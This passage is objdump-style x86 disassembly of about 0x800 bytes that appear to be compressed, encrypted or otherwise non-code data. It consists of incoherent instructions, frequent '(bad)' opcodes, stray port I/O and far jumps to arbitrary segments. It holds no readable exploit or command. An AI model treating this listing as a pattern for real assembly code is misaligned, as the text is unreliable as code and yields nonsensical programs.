  42231a:	xlat   BYTE PTR ds:[ebx]
  42231b:	pop    edx
  42231c:	sahf   
  42231d:	push   ebx
  42231e:	imul   esi,edx,0x2
  422321:	loopne 0x422350
  422323:	popf   
  422324:	or     ah,BYTE PTR [ecx+0x66]
  422327:	jae    0x422353
  422329:	repnz shl al,0x7d
  42232d:	jae    0x422309
  42232f:	cs xchg ebx,eax
  422331:	mov    al,ds:0x91942b1a
  422336:	daa    
  422337:	repnz mov ch,0xa9
  42233a:	(bad)  
  42233b:	pop    ss
  42233c:	frstor [ebx]
  42233e:	mov    eax,ds:0x8f06e595
  422343:	icebp  
  422344:	mov    DWORD PTR [edx-0x2b],edi
  422347:	dec    esp
  422348:	xor    ch,BYTE PTR [esi]
  42234a:	jno    0x422303
  42234c:	test   eax,0x933006cc
  422351:	mov    esi,0xfc9d401e
  422356:	mov    al,ds:0x21fd5bf0
  42235b:	mov    ebp,0x2611087a
  422360:	inc    ebp
  422361:	sbb    bh,BYTE PTR [esi+0x37]
  422364:	jp     0x42236b
  422366:	adc    al,0xe5
  422368:	or     eax,0x2b62278
  42236d:	jmp    0x422388
  42236f:	icebp  
  422370:	fdivp  st(0),st
  422372:	adc    ebx,DWORD PTR [esi]
  422374:	push   0x69
  422376:	pop    ebp
  422377:	mov    dl,0xe3
  422379:	fisubr WORD PTR [esi-0x1a]
  42237c:	mov    dl,0x6d
  42237e:	pop    ss
  42237f:	xor    DWORD PTR [eax-0x33],ebx
  422382:	sub    eax,0x4401b07
  422387:	in     eax,0xba
  422389:	mov    al,0x8d
  42238b:	out    dx,al
  42238c:	jmp    0x4223fe
  42238e:	jnp    0x4223b8
  422390:	push   ecx
  422391:	mov    dl,0x20
  422393:	sub    eax,0xc995f8d1
  422398:	pop    es
  422399:	pop    esi
  42239a:	jle    0x42239a
  42239c:	inc    edi
  42239d:	pop    ds
  42239e:	int    0x44
  4223a0:	xor    al,0xe3
  4223a2:	push   ebp
  4223a3:	(bad)
  4223a6:	mov    esi,0x3a65c45d
  4223ab:	je     0x42239f
  4223ad:	mov    fs,WORD PTR [ecx+edi*1]
  4223b0:	test   BYTE PTR cs:[edi+0x14],bl
  4223b4:	and    BYTE PTR ds:0xb8f6ce45,bl
  4223ba:	mov    bh,0xfd
  4223bc:	sub    DWORD PTR [esi-0x53],0xffffffd4
  4223c0:	hlt    
  4223c1:	add    ah,bl
  4223c3:	out    dx,al
  4223c4:	jp     0x4223ec
  4223c6:	rcl    BYTE PTR [eax-0x60f7e1b],1
  4223cc:	in     eax,dx
  4223cd:	out    dx,al
  4223ce:	mov    esp,DWORD PTR [esi+0x79f2b7b8]
  4223d4:	mov    esi,0x28f9686d
  4223d9:	xchg   esp,eax
  4223da:	jge    0x4223d8
  4223dc:	aas    
  4223dd:	pop    esi
  4223de:	jno    0x422403
  4223e0:	mov    ebp,DWORD PTR [ebx-0x47]
  4223e3:	fdivrp st(3),st
  4223e5:	in     al,dx
  4223e6:	out    dx,al
  4223e7:	(bad)  
  4223e8:	jecxz  0x4223f9
  4223ea:	push   esi
  4223eb:	and    eax,0x9214c042
  4223f0:	loopne 0x4223f4
  4223f2:	ret    0x8254
  4223f5:	pop    edi
  4223f6:	dec    esi
  4223f7:	dec    edi
  4223f8:	dec    edi
  4223f9:	or     eax,0x7d2dcda
  4223fe:	in     al,dx
  4223ff:	popf   
  422400:	das    
  422401:	fldz   
  422403:	and    ecx,DWORD PTR [esi-0x335495d6]
  422409:	and    ch,ah
  42240b:	mov    ah,BYTE PTR [edx-0x590e1916]
  422411:	nop
  422412:	mov    WORD PTR [edx],?
  422414:	lds    ebp,FWORD PTR [esp+ebx*2]
  422417:	adc    DWORD PTR [eax+eiz*4-0x2a],eax
  42241b:	sub    eax,DWORD PTR ds:0x20b350a6
  422421:	jno    0x422482
  422423:	jl     0x422497
  422425:	retf   0xe9a8
  422428:	clc    
  422429:	sbb    eax,0x5fa8bd40
  42242e:	pop    es
  42242f:	in     al,0xe8
  422431:	jmp    0x42240b
  422433:	jnp    0x422407
  422435:	adc    al,0x82
  422437:	dec    ecx
  422438:	push   0xc49123d6
  42243d:	inc    edx
  42243e:	xchg   edi,eax
  42243f:	and    bl,BYTE PTR [ebx]
  422441:	popa   
  422442:	inc    esi
  422443:	cld    
  422444:	jns    0x42244a
  422446:	mov    ecx,0x2dc958f1
  42244b:	xchg   BYTE PTR [esi+0x74],dh
  42244e:	jmp    0x822f:0x5f6981c5
  422455:	mov    bh,0xb3
  422457:	xor    eax,0x8bc38c7f
  42245c:	(bad)  
  42245d:	loopne 0x42241d
  42245f:	daa    
  422460:	inc    ebp
  422461:	xchg   ecx,eax
  422462:	add    ecx,DWORD PTR [ebp+edi*8-0x1f]
  422466:	jns    0x4223f7
  422468:	add    cl,BYTE PTR [ebp+ebx*1-0x5cd9b174]
  42246f:	dec    eax
  422470:	or     DWORD PTR [esi+0x3e],0x666f1db1
  422477:	inc    eax
  422478:	push   es
  422479:	(bad)  
  42247a:	sti    
  42247b:	lock sbb BYTE PTR [edi],cl
  42247e:	jbe    0x422427
  422480:	imul   edi,DWORD PTR [edi+0x74],0xcd4b930f
  422487:	mov    DWORD PTR ds:0xb623d1ad,ebx
  42248d:	popa   
  42248e:	and    dl,cl
  422490:	inc    ecx
  422491:	unpcklps xmm5,xmm4
  422494:	and    eax,0x72ca5566
  422499:	ror    BYTE PTR ds:0x70c0c602,0xfb
  4224a0:	out    0xde,eax
  4224a2:	add    eax,0x5ae29752
  4224a7:	mov    esp,0xb5d6423c
  4224ac:	sbb    eax,0x9798d29a
  4224b1:	dec    edi
  4224b2:	jmp    0xc888:0x53d788a6
  4224b9:	add    edx,DWORD PTR [esi-0x40]
  4224bc:	les    esp,FWORD PTR [edi-0x2f9429e0]
  4224c2:	sub    eax,0xb9c7ab7c
  4224c7:	sbb    eax,0x9c9a748c
  4224cc:	cmp    ebp,0xbd9668f3
  4224d2:	inc    ecx
  4224d3:	xchg   ecx,eax
  4224d4:	add    BYTE PTR [ebx+0x38202679],bh
  4224da:	jne    0x42249c
  4224dc:	push   ss
  4224dd:	dec    esi
  4224de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224df:	pushf  
  4224e0:	mov    ch,0xfa
  4224e2:	mov    eax,0xb4e18f82
  4224e7:	sbb    dl,BYTE PTR [esi-0x4e851e6d]
  4224ed:	sub    BYTE PTR [edx],0x69
  4224f0:	push   0xe949fd5b
  4224f5:	xchg   BYTE PTR [ebx-0x43],bl
  4224f8:	and    ch,BYTE PTR [eax+0x25]
  4224fb:	out    dx,al
  4224fc:	xor    DWORD PTR [esp+ebp*4-0x2be79c7c],ecx
  422503:	pop    ebp
  422504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422505:	jl     0x422582
  422507:	lods   eax,DWORD PTR ds:[esi]
  422508:	test   DWORD PTR [ecx+esi*2],esi
  42250b:	jmp    0x422558
  42250d:	xchg   DWORD PTR [ebp-0x44],esp
  422510:	jmp    0x422578
  422512:	popa   
  422513:	aad    0x6
  422515:	mov    al,0xab
  422517:	fidiv  WORD PTR ds:0xe882c81e
  42251d:	mov    esi,0xefc7f005
  422522:	jle    0x4224eb
  422524:	cmc    
  422525:	mov    ds:0xaa891db8,al
  42252a:	out    0xb9,eax
  42252c:	sub    BYTE PTR [esi+0x191c195f],bl
  422532:	daa    
  422533:	push   edx
  422534:	sbb    BYTE PTR [edx+0x3d1da555],cl
  42253a:	mov    ds:0xdf6dde85,eax
  42253f:	in     al,0x1e
  422541:	popa   
  422542:	cs sbb ebp,edx
  422545:	jnp    0x42259a
  422547:	pop    edi
  422548:	inc    edx
  422549:	test   BYTE PTR [bp+di+0x2cb1],0x69
  42254f:	sbb    al,0x8b
  422551:	mov    edi,0x67cdb7e4
  422556:	add    eax,0x6a4bfbbf
  42255b:	adc    ebx,DWORD PTR [ebx]
  42255d:	inc    edi
  42255e:	push   es
  42255f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422560:	mov    dl,0x5b
  422562:	add    edx,DWORD PTR [eax+0x2f]
  422565:	sbb    eax,0x502e3453
  42256a:	cmp    eax,0xdd553f5b
  42256f:	in     eax,dx
  422570:	addr16 mov bl,0x28
  422573:	mov    edi,0x4e542fda
  422578:	les    eax,FWORD PTR [esi-0x73a12d36]
  42257e:	add    ecx,DWORD PTR [esi-0x7d87a9ef]
  422584:	ret    0x534a
  422587:	lock mov cl,0xeb
  42258a:	scas   eax,DWORD PTR es:[edi]
  42258b:	sub    bh,BYTE PTR [ecx+0x12]
  42258e:	pop    es
  42258f:	dec    edx
  422590:	in     al,0x34
  422592:	jns    0x422517
  422594:	jne    0x422597
  422596:	sbb    al,0x2b
  422598:	int3   
  422599:	les    eax,FWORD PTR [edx+ebx*4]
  42259c:	js     0x422528
  42259e:	mov    esi,0xd5e78224
  4225a3:	xor    edx,edx
  4225a5:	adc    DWORD PTR [edi+0x2b],esp
  4225a8:	bound  esi,QWORD PTR [ecx-0x1fc686dc]
  4225ae:	jp     0x422591
  4225b0:	pop    es
  4225b1:	xor    dh,BYTE PTR [ebp-0x2]
  4225b4:	mov    al,ds:0x394fd8e6
  4225b9:	xor    ecx,DWORD PTR [ebx-0x52ba90c4]
  4225bf:	cmp    esp,ecx
  4225c1:	test   al,0xd9
  4225c3:	sti    
  4225c4:	cmp    DWORD PTR [esp+edi*2],ebp
  4225c7:	imul   eax,DWORD PTR [eax+ecx*1+0x3b],0xffffff90
  4225cc:	dec    edx
  4225cd:	test   eax,0xecf2a327
  4225d2:	(bad)  
  4225d3:	jle    0x422591
  4225d5:	mov    eax,0xe9b14b84
  4225da:	or     al,BYTE PTR [eax+ebp*2]
  4225dd:	fild   WORD PTR [ecx+0x4f909008]
  4225e3:	fbstp  TBYTE PTR [eax-0x7b192d76]
  4225e9:	sti    
  4225ea:	repz loopne 0x4225d3
  4225ed:	sar    ebx,1
  4225ef:	shr    BYTE PTR [esi],cl
  4225f1:	pusha  
  4225f2:	mov    eax,?
  4225f4:	loop   0x422587
  4225f6:	xor    ebp,DWORD PTR [esi]
  4225f8:	inc    ebx
  4225f9:	div    DWORD PTR [eax-0x18c331c0]
  4225ff:	push   0x3ea1d3f6
  422604:	test   al,0xb0
  422606:	push   0xffffffa6
  422608:	neg    DWORD PTR [ebx-0x1a]
  42260b:	jle    0x422619
  42260d:	gs pop esi
  42260f:	xchg   dh,bl
  422611:	mov    eax,0xc1ee951f
  422616:	hlt    
  422617:	ficomp WORD PTR ds:0xaaf22f00
  42261d:	mov    ds:0xe9938d7,al
  422622:	(bad)  
  422623:	xor    ch,BYTE PTR [eax+eax*1]
  422626:	int3   
  422627:	dec    edx
  422628:	ds das 
  42262a:	into   
  42262b:	arpl   WORD PTR [edi],bx
  42262d:	add    DWORD PTR [ecx],0xffffffe2
  422630:	mov    dh,0x18
  422632:	adc    al,BYTE PTR [esi+0x7a]
  422635:	ss or  al,0x21
  422638:	cs lahf 
  42263a:	pop    ds
  42263b:	jmp    0x422698
  42263d:	xchg   DWORD PTR [edi-0x21],eax
  422640:	add    esi,edi
  422642:	sub    edi,DWORD PTR [ecx-0x2aecfac3]
  422648:	push   cs
  422649:	cmp    al,0xe2
  42264b:	std    
  42264c:	mov    dh,BYTE PTR [ebp+0x5a]
  42264f:	jnp    0x4225d2
  422651:	or     BYTE PTR [ebp+0x36],0x3d
  422655:	out    0x89,eax
  422657:	out    dx,eax
  422658:	jecxz  0x422624
  42265a:	hlt    
  42265b:	nop
  42265c:	cli    
  42265d:	jnp    0x42266c
  42265f:	mov    ds:0xe22c97ac,al
  422664:	sub    cl,cl
  422666:	ins    BYTE PTR es:[edi],dx
  422667:	inc    edx
  422668:	sahf   
  422669:	mov    DWORD PTR [ebx],edx
  42266b:	pop    esp
  42266c:	inc    ecx
  42266d:	cld    
  42266e:	add    ebp,esi
  422670:	jge    0x422694
  422672:	dec    eax
  422673:	and    al,0x46
  422675:	loope  0x422612
  422677:	into   
  422678:	outs   dx,DWORD PTR ds:[esi]
  422679:	xchg   BYTE PTR [edx+0x50f884b1],cl
  42267f:	xchg   DWORD PTR [ebp-0x26],ebx
  422682:	sub    bh,BYTE PTR [eax+0x32]
  422685:	cdq    
  422686:	jo     0x422640
  422688:	and    esp,DWORD PTR [esi]
  42268a:	push   ecx
  42268b:	dec    edi
  42268c:	mov    al,ds:0xc0c73b3e
  422691:	stc    
  422692:	fsub   QWORD PTR [eax+0x6657aa04]
  422698:	in     eax,0x3
  42269a:	xor    al,0x49
  42269c:	pop    ecx
  42269d:	adc    dl,BYTE PTR [eax]
  42269f:	dec    esi
  4226a0:	sti    
  4226a1:	test   eax,0x36c03f5
  4226a7:	in     eax,dx
  4226a8:	les    ebp,FWORD PTR [edi]
  4226aa:	icebp  
  4226ab:	jne    0x422696
  4226ad:	cwde   
  4226ae:	sbb    al,0xca
  4226b0:	xchg   BYTE PTR [ecx+0x56b5034d],ah
  4226b6:	mov    al,ds:0xeebe477c
  4226bb:	or     ebp,DWORD PTR [edx]
  4226bd:	xor    DWORD PTR [ebp-0x1f129a3d],esp
  4226c3:	or     dl,0x18
  4226c6:	es push ebx
  4226c8:	dec    esi
  4226c9:	jle    0x422734
  4226cb:	inc    edx
  4226cc:	pop    edi
  4226cd:	daa    
  4226ce:	push   edi
  4226cf:	jge    0x422729
  4226d1:	dec    esi
  4226d2:	jo     0x4226c1
  4226d4:	ret    
  4226d5:	scas   al,BYTE PTR es:[edi]
  4226d6:	jae    0x4226b3
  4226d8:	xchg   DWORD PTR [ebx],edx
  4226da:	dec    ebp
  4226db:	jecxz  0x422691
  4226dd:	push   esp
  4226de:	jno    0x42273f
  4226e0:	ret    0xfef5
  4226e3:	push   cs
  4226e4:	lds    eax,FWORD PTR [ebp+0x2af434e6]
  4226ea:	fst    QWORD PTR [eax+0x67863241]
  4226f0:	ss jns 0x422697
  4226f3:	sub    cl,ah
  4226f5:	cmp    al,0xb3
  4226f7:	jp     0x42274d
  4226f9:	push   0xcaf7462f
  4226fe:	pop    esi
  4226ff:	loope  0x422764
  422701:	ss ret 0x17f5
  422705:	xor    esi,DWORD PTR ds:0xec7597b9
  42270b:	jbe    0x4226fc
  42270d:	neg    DWORD PTR [ebx-0x56]
  422710:	add    BYTE PTR ds:0xc36a68a7,dl
  422716:	ror    ebp,1
  422718:	(bad)  
  422719:	mov    esp,0xf79e5163
  42271e:	pushf  
  42271f:	stc    
  422720:	pop    ecx
  422721:	fwait
  422722:	add    DWORD PTR [eax+eax*2+0x515529ea],edi
  422729:	fwait
  42272a:	(bad)  
  42272b:	push   dx
  42272d:	add    al,0xfe
  42272f:	xor    DWORD PTR [edx-0x3fa45fb8],edx
  422735:	in     al,dx
  422736:	jne    0x42275f
  422738:	data16 shl BYTE PTR [bx+si+0x6059],0x0
  42273f:	test   al,0xb9
  422741:	sar    DWORD PTR [edx+0x76e01ae9],0x18
  422748:	and    edx,DWORD PTR [eax]
  42274a:	outs   dx,DWORD PTR ds:[esi]
  42274b:	aad    0xbb
  42274d:	in     eax,0x56
  42274f:	inc    edi
  422750:	scas   al,BYTE PTR es:[edi]
  422751:	aaa    
  422752:	out    0x67,al
  422754:	xchg   DWORD PTR [ebx+eax*2+0x25ba5b9a],edx
  42275b:	inc    esi
  42275c:	sbb    DWORD PTR [eax+0x67e0f341],ebx
  422762:	dec    esp
  422763:	dec    esp
  422764:	and    al,0xc8
  422766:	cld    
  422767:	loopne 0x4227ae
  422769:	repnz iret 
  42276b:	mov    ch,0x49
  42276d:	mov    BYTE PTR [ecx+0x15],al
  422770:	sbb    ecx,DWORD PTR [eax]
  422772:	inc    esi
  422773:	(bad)  
  422774:	aam    0x6e
  422776:	out    0xd,al
  422778:	aaa    
  422779:	cmp    esi,DWORD PTR [eax-0x11]
  42277c:	jmp    0x52bd:0x868f1545
  422783:	dec    eax
  422784:	cmc    
  422785:	fwait
  422786:	cmp    BYTE PTR [edi],bl
  422788:	cs in  eax,0x2a
  42278b:	push   ss
  42278c:	cmp    al,0x55
  42278e:	pushf  
  42278f:	sub    BYTE PTR [edi+edi*4-0x75],ch
  422793:	cmp    bl,BYTE PTR [ebx+0x31f316a4]
  422799:	mov    edi,0xffafc255
  42279e:	jae    0x422723
  4227a0:	mov    ah,0xfc
  4227a2:	call   0x16bc:0xe035f531
  4227a9:	mov    ebx,0x856ac6f9
  4227ae:	and    BYTE PTR [ecx],bl
  4227b0:	test   al,0x2a
  4227b2:	mov    al,ds:0x2f262dc4
  4227b7:	jae    0x42282f
  4227b9:	imul   edi,DWORD PTR [ebp+0x697a80fd],0xbbc334a4
  4227c3:	xlat   BYTE PTR ds:[ebx]
  4227c4:	sub    ebp,DWORD PTR [edi+0x4428f34d]
  4227ca:	retf   
  4227cb:	ds fsub st(3),st
  4227ce:	(bad)  
  4227cf:	push   cs
  4227d0:	rcl    DWORD PTR [edi-0x6e],cl
  4227d3:	out    0x3f,al
  4227d5:	shr    BYTE PTR [ebx+0x79bcd202],0xf
  4227dc:	sub    DWORD PTR [ecx-0x2860b5e0],edi
  4227e2:	shl    DWORD PTR [edi+0x327f11d1],1
  4227e8:	out    0xfb,al
  4227ea:	pop    edx
  4227eb:	add    DWORD PTR [eax],edx
  4227ed:	sti    
  4227ee:	or     dl,cl
  4227f0:	cmc    
  4227f1:	jmp    0x8a115fa9
  4227f6:	in     al,0xe4
  4227f8:	sub    al,0x9e
  4227fa:	mov    bl,0x10
  4227fc:	add    al,0x4c
  4227fe:	retf   0x9c2c
  422801:	jl     0x42281e
  422803:	dec    esp
  422804:	ret    
  422805:	outs   dx,DWORD PTR ds:[esi]
  422806:	dec    ecx
  422807:	push   edi
  422808:	pop    ss
  422809:	iret   
  42280a:	inc    ebx
  42280b:	mov    al,0x52
  42280d:	mov    eax,ds:0xa96e41d1
  422812:	sub    eax,0xa1dd2ca1
  422817:	shl    DWORD PTR [ebp-0xd],0x29
  42281b:	inc    esi
  42281c:	repz adc eax,0xd87b8dcf
  422822:	inc    edi
  422823:	pop    edi
  422824:	jecxz  0x42287c
  422826:	rcl    BYTE PTR [edi+ebp*4],0xc1
  42282a:	sbb    DWORD PTR [eax-0x65],edx
  42282d:	add    edx,ebx
  42282f:	fdivr  DWORD PTR [edx-0x5fd44768]
  422835:	cmp    ch,ch
  422837:	retf   0xfa8a
  42283a:	xchg   edi,eax
  42283b:	lods   eax,DWORD PTR ds:[esi]
  42283c:	and    ebp,DWORD PTR [ebx+0x45]
  42283f:	pop    ecx
  422840:	pop    esi
  422841:	inc    ecx
  422842:	jp     0x422832
  422844:	pop    eax
  422845:	lods   eax,DWORD PTR ds:[esi]
  422846:	push   edi
  422847:	call   0xa16dfc14
  42284c:	in     eax,0x8d
  42284e:	mov    dl,BYTE PTR [esi+0x174c6c5]
  422854:	sub    cl,BYTE PTR [esi+0x470c96e0]
  42285a:	(bad)  [ecx]
  42285c:	inc    ecx
  42285d:	or     al,0x46
  42285f:	out    0x3b,al
  422861:	outs   dx,BYTE PTR ds:[esi]
  422862:	sub    DWORD PTR [ebx+0x3a],ebx
  422865:	pop    edx
  422866:	cmp    eax,0x54f7b57
  42286b:	enter  0xa25e,0x49
  42286f:	mov    bl,0x89
  422871:	xlat   BYTE PTR es:[ebx]
  422873:	sbb    al,cl
  422875:	adc    cl,dl
  422877:	pop    ss
  422878:	dec    BYTE PTR [esi]
  42287a:	mov    eax,0x2006368d
  42287f:	mov    ebp,0xdddcfe0f
  422884:	leave  
  422885:	push   0xfffffff8
  422887:	clc    
  422888:	stc    
  422889:	pop    edx
  42288a:	in     al,dx
  42288b:	icebp  
  42288c:	outs   dx,BYTE PTR ds:[esi]
  42288d:	fisub  WORD PTR [eax]
  42288f:	xchg   ebx,eax
  422890:	cdq    
  422891:	or     DWORD PTR ds:0xb50cf572,esi
  422897:	xchg   esi,eax
  422898:	mov    al,0xb5
  42289a:	pop    esi
  42289b:	dec    edi
  42289c:	and    eax,esp
  42289e:	or     eax,0xc7c28613
  4228a3:	jae    0x422874
  4228a5:	push   esi
  4228a6:	call   0xc563:0x52a18f72
  4228ad:	pop    edi
  4228ae:	std    
  4228af:	adc    ebx,edx
  4228b1:	mov    al,ds:0x58dc391c
  4228b6:	stc    
  4228b7:	jnp    0x42286b
  4228b9:	ss jg  0x422936
  4228bc:	fisttp WORD PTR fs:[edi-0x1c]
  4228c0:	mov    DWORD PTR [ebp+ebx*4-0x74c6b21a],0x8d407621
  4228cb:	fdivr  QWORD PTR [ecx+0x63db8699]
  4228d1:	lods   eax,DWORD PTR ds:[esi]
  4228d2:	test   BYTE PTR [edx-0x1b],0xae
  4228d6:	dec    eax
  4228d7:	(bad)  
  4228d8:	pop    esp
  4228d9:	cmp    al,bl
  4228db:	push   ebp
  4228dc:	jno    0x422891
  4228de:	jle    0x42294d
  4228e0:	nop
  4228e1:	ret    0x5bd8
  4228e4:	push   es
  4228e5:	pop    esi
  4228e6:	xlat   BYTE PTR ds:[ebx]
  4228e7:	dec    esp
  4228e8:	mov    esi,0x4bb4a771
  4228ed:	mov    cl,0x13
  4228ef:	jp     0x422946
  4228f1:	ins    DWORD PTR es:[edi],dx
  4228f2:	pop    ecx
  4228f3:	sbb    BYTE PTR [esi-0x24],0xd2
  4228f7:	mov    dh,0x1c
  4228f9:	aad    0x2b
  4228fb:	(bad)  
  4228fc:	fidivr WORD PTR [ecx*8-0x5723a452]
  422903:	and    BYTE PTR [ebx-0x47],ah
  422906:	push   es
  422907:	push   cs
  422908:	test   BYTE PTR [ebp-0x9aede6a],ah
  42290e:	xchg   ebp,eax
  42290f:	jo     0x42290c
  422911:	sbb    DWORD PTR [ebx-0x5],eax
  422914:	add    DWORD PTR [eiz*4-0x6fb590c],edx
  42291b:	test   al,0xe2
  42291d:	jg     0x4228e6
  42291f:	(bad)
  422922:	add    al,0xa9
  422924:	pushf  
  422925:	pusha  
  422926:	sbb    esp,DWORD PTR [edi-0x3]
  422929:	push   ecx
  42292a:	adc    bl,BYTE PTR [ecx-0x1747ba6e]
  422930:	popf   
  422931:	xchg   esp,eax
  422932:	(bad)  
  422933:	and    eax,0x78243ec4
  422938:	out    dx,al
  422939:	adc    dh,BYTE PTR [ebp-0x5a]
  42293c:	js     0x422973
  42293e:	cs cdq 
  422940:	lea    esp,[eax+0x73052f23]
  422946:	and    al,0xf9
  422948:	mov    edi,0xd8933a16
  42294d:	inc    esi
  42294e:	add    al,BYTE PTR [ecx]
  422950:	sub    al,0x95
  422952:	push   edx
  422953:	or     DWORD PTR [eax],esp
  422955:	dec    edi
  422956:	mov    edi,0x3f1b2d2e
  42295b:	sub    DWORD PTR [ecx-0x31],ebp
  42295e:	fnstsw WORD PTR [esi-0x48452e61]
  422964:	(bad)  
  422967:	fadd   QWORD PTR [ecx+0x41]
  42296a:	out    dx,al
  42296b:	inc    ebx
  42296c:	xor    bl,BYTE PTR [ebx-0x1b9a583e]
  422972:	sub    al,0x7a
  422974:	mov    ch,0x8
  422976:	mov    dl,0x9
  422978:	stos   WORD PTR es:[edi],ax
  42297a:	pop    ecx
  42297b:	or     al,0x51
  42297d:	in     al,dx
  42297e:	cmc    
  42297f:	lea    edi,[esi]
  422981:	fcmovbe st,st(4)
  422983:	fbld   TBYTE PTR [edx]
  422985:	pop    es
  422986:	shl    edx,1
  422988:	push   0x45
  42298a:	std    
  42298b:	sub    DWORD PTR ds:0x95353a1d,ecx
  422991:	arpl   WORD PTR [edi+0x1324bfb0],si
  422997:	xlat   BYTE PTR ds:[ebx]
  422998:	in     al,dx
  422999:	sub    al,0x82
  42299b:	in     eax,dx
  42299c:	repnz es dec edx
  42299f:	retf   0xe69b
  4229a2:	lods   al,BYTE PTR ds:[esi]
  4229a3:	or     ch,BYTE PTR [ebx]
  4229a5:	sti    
  4229a6:	xchg   BYTE PTR [ebx+0x7f6837ac],dh
  4229ac:	lods   eax,DWORD PTR ds:[esi]
  4229ad:	sub    DWORD PTR [eax],ecx
  4229af:	cmp    al,0x11
  4229b1:	dec    DWORD PTR [edi+eiz*8+0x60]
  4229b5:	mov    eax,ds:0x4c7013e5
  4229ba:	inc    esp
  4229bb:	sub    ebx,DWORD PTR [ebp+0x3d]
  4229be:	call   esi
  4229c0:	adc    al,0x49
  4229c2:	lods   al,BYTE PTR ds:[esi]
  4229c3:	iret   
  4229c4:	xchg   esp,eax
  4229c5:	in     eax,dx
  4229c6:	fisttp DWORD PTR [ebx+0x5010e23b]
  4229cc:	ret    
  4229cd:	outs   dx,DWORD PTR gs:[esi]
  4229cf:	mov    cl,0x58
  4229d1:	aaa    
  4229d2:	mov    ds:0xd65baed2,eax
  4229d7:	ficom  WORD PTR [ebx-0x66]
  4229da:	push   es
  4229db:	xor    bh,BYTE PTR [esi]
  4229dd:	arpl   WORD PTR [edi-0x1b],ax
  4229e0:	nop
  4229e1:	bound  esi,QWORD PTR [esi-0x7bfa40df]
  4229e7:	aad    0x29
  4229e9:	mov    DWORD PTR [ebx],ebp
  4229eb:	sbb    dh,dl
  4229ed:	lods   al,BYTE PTR ds:[esi]
  4229ee:	std    
  4229ef:	popf   
  4229f0:	sti    
  4229f1:	out    0x28,al
  4229f3:	hlt    
  4229f4:	adc    BYTE PTR [eax],cl
  4229f6:	add    bh,bh
  4229f8:	jecxz  0x4229a3
  4229fa:	adc    DWORD PTR [edi+0x46274d9b],eax
  422a00:	lods   al,BYTE PTR es:[esi]
  422a02:	das    
  422a03:	lock and eax,0x3285a21
  422a09:	jnp    0x422a6b
  422a0b:	loope  0x422a14
  422a0d:	outs   dx,BYTE PTR ds:[esi]
  422a0e:	gs or  al,cl
  422a11:	fadd   st,st(4)
  422a13:	xchg   edi,eax
  422a14:	jbe    0x4229d2
  422a16:	(bad)  
  422a17:	shl    al,1
  422a19:	test   eax,0x3608c241
  422a1e:	(bad)  
  422a1f:	(bad)  
  422a20:	jg     0x4229ba
  422a22:	ss mov bl,0x6e
  422a25:	jbe    0x422a3c
  422a27:	sbb    DWORD PTR [ebx+0x77a1c152],edi
  422a2d:	in     eax,0x9e
  422a2f:	test   al,0x8f
  422a31:	xchg   edx,eax
  422a32:	in     eax,0xa8
  422a34:	xlat   BYTE PTR ds:[ebx]
  422a35:	fmul   st(6),st
  422a37:	and    BYTE PTR [esi],bl
  422a39:	mov    bh,0xc1
  422a3c:	jmp    DWORD PTR [ebx]
  422a3e:	(bad)  
  422a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a40:	iret   
  422a41:	stc    
  422a42:	push   esi
  422a43:	push   edx
  422a44:	sub    esi,DWORD PTR [edx+0x4089db18]
  422a4a:	and    DWORD PTR [edx],edx
  422a4c:	fstp   TBYTE PTR [esi-0x5b50f12d]
  422a52:	pop    edi
  422a53:	jbe    0x422a8b
  422a55:	gs jbe 0x422a84
  422a58:	adc    eax,esi
  422a5a:	(bad)
  422a5d:	xor    esp,DWORD PTR [edx+0x33d0b529]
  422a63:	inc    ebp
  422a64:	push   ss
  422a65:	dec    ebp
  422a66:	(bad)  
  422a67:	mov    es,esp
  422a69:	mov    bh,0xd
  422a6b:	sub    ecx,edi
  422a6d:	push   edx
  422a6e:	mov    dh,0x0
  422a70:	xchg   ecx,eax
  422a71:	repz mov ecx,0xbb46ef86
  422a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a78:	xor    BYTE PTR [ebx+0x73687207],ah
  422a7e:	and    al,0x9d
  422a80:	in     al,0x17
  422a82:	mul    BYTE PTR [edx]
  422a84:	std    
  422a85:	xor    al,0xae
  422a87:	ja     0x422b02
  422a89:	pop    es
  422a8a:	inc    ebp
  422a8b:	stc    
  422a8c:	ins    BYTE PTR es:[edi],dx
  422a8d:	jmp    0xac9a:0x734a786c
  422a94:	push   ds
  422a95:	add    bh,dl
  422a97:	in     al,0xf5
  422a99:	enter  0xfad5,0x3a
  422a9d:	sub    edi,ecx
  422a9f:	pop    esi
  422aa0:	lods   eax,DWORD PTR ds:[esi]
  422aa1:	iret   
  422aa2:	xchg   DWORD PTR [ecx+ebp*8],edx
  422aa5:	(bad)  
  422aa6:	ins    BYTE PTR es:[edi],dx
  422aa7:	xchg   DWORD PTR gs:[eax-0x16],ecx
  422aab:	lea    edi,[esi+0x4b13b416]
  422ab1:	or     eax,0x8d403f63
  422ab6:	lock xchg edx,eax
  422ab8:	jle    0x422a56
  422aba:	xor    DWORD PTR [ebx],esi
  422abc:	scas   al,BYTE PTR es:[edi]
  422abd:	and    BYTE PTR [edi],0x60
  422ac0:	bound  edx,QWORD PTR [edx+edx*1-0x3da71a78]
  422ac7:	outs   dx,DWORD PTR ds:[esi]
  422ac8:	dec    ch
  422aca:	ret    0x5da6
  422acd:	es rcr ecx,1
  422ad0:	and    eax,0x86f94d0d
  422ad5:	xchg   ebx,eax
  422ad6:	hlt    
  422ad7:	xor    DWORD PTR [ecx+0x7a],edi
  422ada:	cwde   
  422adb:	jb     0x422aaf
  422add:	sub    bh,ch
  422adf:	mov    cl,0x89
  422ae1:	mov    bh,0x81
  422ae3:	mov    ecx,0x362bc89c
  422ae8:	fs in  al,dx
  422aea:	out    dx,al
  422aeb:	sbb    BYTE PTR [ebx+0x49],0xc0
  422aef:	cmp    al,0x80
  422af1:	inc    ebx
  422af2:	jl     0x422b1f
  422af4:	clc    
  422af5:	into   
  422af6:	cmp    BYTE PTR [eax],0xaa
  422af9:	rcr    DWORD PTR [ecx],0xcd
  422afc:	lahf   
  422afd:	mov    al,0x89
  422aff:	call   0x411aa43c
  422b04:	aad    0xcc
  422b06:	das    
  422b07:	clc    
  422b08:	gs (bad) 
  422b0b:	cli    
  422b0c:	or     BYTE PTR [ecx-0x6a],0x32
  422b10:	cmp    DWORD PTR [edi],ebp
